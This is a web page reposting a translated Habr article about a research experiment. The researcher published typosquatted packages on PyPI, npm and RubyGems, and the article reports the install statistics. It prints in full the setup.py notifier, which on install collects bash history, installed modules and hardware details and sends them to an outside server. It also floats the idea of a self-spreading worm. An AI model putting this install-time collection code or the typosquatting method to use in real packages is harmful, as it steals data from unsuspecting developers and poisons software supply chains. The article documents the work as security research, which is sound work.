<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Taipokvotting in the Python, Node.JS and Ruby repositories</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="The effectiveness of the attack is proven when spreading malicious code through the PyPi (Python), Npmjs.com (Node.js) and rubygems.org (Ruby) reposit...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Taipokvotting in the Python, Node.JS and Ruby repositories</h1><div class="post__text post__text-html js-mediator-article"><h4>  The effectiveness of the attack is proven when spreading malicious code through the PyPi (Python), Npmjs.com (Node.js) and rubygems.org (Ruby) repositories. </h4><br>  It turns out that tayposkvotting is suitable not only for domain name registration.  German security expert Nikolai Chakher <a href="http://incolumitas.com/2016/06/08/typosquatting-package-managers/">demonstrated</a> how easy it is to distribute malicious code through <a href="https://pypi.python.org/pypi">PyPi</a> , a catalog of software written in the Python programming language, as well as through the NodeJS (Npmsjs.com) and Ruby repositories (Rubygems.org). <br><br>  So, we publish a package with a typo in the name - and wait until someone makes a typo in his console ... <br><br><h3>  &gt; <font color="red">sudo pip install reqeusts</font> </h3><br>  During a <a href="http://incolumitas.com/2016/06/08/typosquatting-package-managers/">small experiment,</a> Nikolai infected 17,000 computers for research purposes, with 43.6% of installations set up as administrator, including on servers in the government domains <b>.gov</b> and <b>.mil</b> . <br><a name="habracut"></a><br><div class="spoiler">  <b class="spoiler_title">Taipokvotting and bitskvotting</b> <div class="spoiler_text">  Hackers have long used time consistency to attract random traffic to meaningless sites like microsodft.com.  This attack is effective due to the laws of large numbers.  If a billion people type the URL of the site in the address bar, then a million of them will make some kind of mistake.  Approximately one thousand will visit the prepared site, where an exploit pack with fresh 0day is waiting for them.  Or, for example, you can simply run ads on such sites, getting money from the air. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      Traditional tayposkvottery register thousands of addresses, in advanced companies always together with the main domain register possible options for taiposquatting, setting a redirect.  Some even use tayposkvotting to take someone else's traffic.  For example, Google <a href="https://habrahabr.ru/post/137261/">redirects to itself traffic from the domain duck.com</a> . <br><br>  By the way, there is also <a href="http://media.blackhat.com/bh-us-11/Dinaburg/BH_US_11_Dinaburg_Bitsquatting_WP.pdf">BitSquatting</a> - an exotic variety of TaipoSquatting.  Here, the calculation is not on the human, but on a hardware error.  Bit skvotting relies on any of the devices connected to the Internet to accidentally make a mistake and change one necessary bit in the DNS query, so that the traffic will go instead of the original site to the attacker's site.  For such attacks, CDN and ad network domains are selected, the content from which is uploaded to thousands of popular sites.  These are domains like fbcdn.net, 2mdn.net and akamai.com. </div></div><br>  Nikolai Chakher familiarized himself with the methods of standard tayposkvottinga and wondered: how many people will be mistaken in the name of the package if they manually install the pockets through the package manager.  For example, the <i>pip</i> package manager downloads packages from the PyPi repository.  If we create an arbitrary package called <i>reqeusts</i> (anyone can download it to the repository) instead of the standard <a href="https://pypi.python.org/pypi/requests/">requests</a> module, then all users who make a typo will download and install the package when typing the command. <br><br>  To test the effectiveness of the attack, Nikolay created <b>214 packages</b> with various types of typos in the name, including unregistered variants of names from the standard library (for example, urllib2), and uploaded them to the repository for several months in the second half of 2015 and early 2016 . <br><br>  In Python packages, the malicious code was hidden in the <i>setup.py file</i> , which runs as an administrator.  For NPM modules, a <a href="https://docs.npmjs.com/misc/scripts">pre-installation script</a> was written, but Ruby <a href="http://blog.costan.us/2008/11/post-install-post-update-scripts-for.html">had to tinker</a> with the packages. <br><br>  When installing each dummy tayposkvottersky package sent a notification to the server with the IP-address, operating system, user rights and timestamp. <br><br><div class="spoiler">  <b class="spoiler_title">Notifier Code</b> <div class="spoiler_text"><pre><code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/env python # -*- coding: utf-8 -*- """ Notification program used in the typo squatting bachelor thesis for the python package index. Created in autumn 2015. Copyright by Nikolai Tschacher """ import os import ctypes import sys import platform import subprocess debug = False # we are using Python3 if sys.version_info[0] == 3: import urllib.request from urllib.parse import urlencode GET = urllib.request.urlopen def python3POST(url, data={}, headers=None): """ Returns the response of the POST request as string or False if the resource could not be accessed. """ data = urllib.parse.urlencode(data).encode() request = urllib.request.Request(url, data) try: reponse = urllib.request.urlopen(request, timeout=15) cs = reponse.headers.get_content_charset() if cs: return reponse.read().decode(cs) else: return reponse.read().decode('utf-8') except urllib.error.HTTPError as he: # try again if some 400 or 500 error was received return '' except Exception as e: # everything else fails return False POST = python3POST # we are using Python2 else: import urllib2 from urllib import urlencode GET = urllib2.urlopen def python2POST(url, data={}, headers=None): """ See python3POST """ req = urllib2.Request(url, urlencode(data)) try: response = urllib2.urlopen(req, timeout=15) return response.read() except urllib2.HTTPError as he: return '' except Exception as e: return False POST = python2POST try: from subprocess import DEVNULL # py3k except ImportError: DEVNULL = open(os.devnull, 'wb') def get_command_history(): if os.name == 'nt': # handle windows # http://serverfault.com/questions/95404/ #is-there-a-global-persistent-cmd-history # apparently, there is no history in windows :( return '' elif os.name == 'posix': # handle linux and mac cmd = 'cat {}/.bash_history | grep -E "pip[23]? install"' return os.popen(cmd.format(os.path.expanduser('~'))).read() def get_hardware_info(): if os.name == 'nt': # handle windows return platform.processor() elif os.name == 'posix': # handle linux and mac if sys.platform.startswith('linux'): try: hw_info = subprocess.check_output('lshw -short', stderr=DEVNULL, shell=True) except: hw_info = '' if not hw_info: try: hw_info = subprocess.check_output('lspci', stderr=DEVNULL, shell=True) except: hw_info = '' hw_info += '\n' +\ os.popen('free -m').read().strip() return hw_info elif sys.platform == 'darwin': # According to https://developer.apple.com/library/ # mac/documentation/Darwin/Reference/ManPages/ # man8/system_profiler.8.html # no personal information is provided by detailLevel: mini return os.popen('system_profiler -detailLevel mini').read() def get_all_installed_modules(): # first try the default path pip_list = os.popen('pip list').read().strip() if pip_list: return pip_list else: if os.name == 'nt': paths = ('C:/Python27', 'C:/Python34', 'C:/Python26', 'C:/Python33', 'C:/Python35', 'C:/Python', 'C:/Python2', 'C:/Python3') # try some paths that make sense to me for loc in paths: pip_location = os.path.join(loc, 'Scripts/pip.exe') if os.path.exists(pip_location): cmd = '{} list'.format(pip_location) try: pip_list = subprocess.check_output(cmd, stderr=DEVNULL, shell=True) except: pip_list = '' if pip_list: return pip_list return '' def notify_home(url, package_name, intended_package_name): host_os = platform.platform() try: admin_rights = bool(os.getuid() == 0) except AttributeError: try: ret = ctypes.windll.shell32.IsUserAnAdmin() admin_rights = bool(ret != 0) except: admin_rights = False if os.name != 'nt': try: pip_version = os.popen('pip --version').read() except: pip_version = '' else: pip_version = platform.python_version() url_data = { 'p1': package_name, 'p2': intended_package_name, 'p3': 'pip', 'p4': host_os, 'p5': admin_rights, 'p6': pip_version, } post_data = { 'p7': get_command_history(), 'p8': get_all_installed_modules(), 'p9': get_hardware_info(), } url_data = urlencode(url_data) response = POST(url + url_data, post_data) if debug: print(response) print('') print("Warning!!! Maybe you made a typo in your installation\ command or the module does only exist in the python stdlib?!") print("Did you want to install '{}'\ instead of '{}'??!".format(intended_package_name, package_name)) print('For more information, please\ visit http://svs-repo.informatik.uni-hamburg.de/') def main(): if debug: notify_home('http://localhost:8000/app/?', 'pmba_basic', 'pmba_basic') else: notify_home('http://svs-repo.informatik.uni-hamburg.de/app/?', 'pmba_basic', 'pmba_basic') if __name__ == '__main__': main()</span></span></code> </pre> </div></div><br>  The results were staggering.  The notifier on the server received <b>45334 installation notifications</b> from <b>17289 unique IP addresses</b> . <br><br>  Most installations generated bogus PyPi packets: 15221 unique IP addresses.  The share of rubygems.org accounted for 1,631 installations, for NPM - 525. On average, each package was installed 92 times, but the most popular was urllib2 with 3929 unique installations. <br><br><img src="https://habrastorage.org/files/1cc/499/4ad/1cc4994adbb34402afc77e78705a0eaf.png"><br><br>  The victims of the attack were distributed between different operating systems: Linux (8614), Windows (6174), OS X (4758) and other operating systems (57). <br><br>  The mapping of IP addresses to hosts gave the following picture. <br><br><img src="https://habrastorage.org/files/d65/718/9fd/d657189fd41e44049d26858e8e223117.png"><br><br>  <b>National identity of the hosts by country</b> <br><img src="https://habrastorage.org/files/82d/dd0/129/82ddd0129c124286a7fe2c86e8d1367f.png"><br><br>  The full results of the study are published in the <a href="http://incolumitas.com/data/thesis.pdf">thesis of</a> Nikolai Chakher. <br><br>  By the way, the author suggests the idea that this type of attack can be used to spread the worm, which will mine the history of the commands entered in the Linux and OS X console to find new typos that are not in the database. <br><br>  Theoretically, the worm itself can search for new attack vectors (new typos), generate new packages, upload them to the repository along with its code and, thus, spread further. </div><p>Source: <a href="https://habr.com/ru/post/357658/">https://habr.com/ru/post/357658/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../357648/index.html">Introduction to writing tests and familiarity with xUnit</a></li>
<li><a href="../357650/index.html">Jennifer Zero and other bad surnames</a></li>
<li><a href="../357652/index.html">Is the era of "fat" software coming to an end?</a></li>
<li><a href="../357654/index.html">Github declared inappropriate for hosting GNU projects due to collaboration with Roskomnadzor</a></li>
<li><a href="../357656/index.html">The developer of an iOS application for Nissan thoughtlessly copied the code from Stack Overflow directly into production</a></li>
<li><a href="../357660/index.html">Modern web development. How did we come to this?</a></li>
<li><a href="../357662/index.html">Microsoft learned to clean up after themselves?</a></li>
<li><a href="../357664/index.html">Programming is not a pound of raisins</a></li>
<li><a href="../357666/index.html">Anti-interference coding. Part 1: Hamming code</a></li>
<li><a href="../357668/index.html">XCA - enterprise certification center or the saga of Russian and German programmers</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>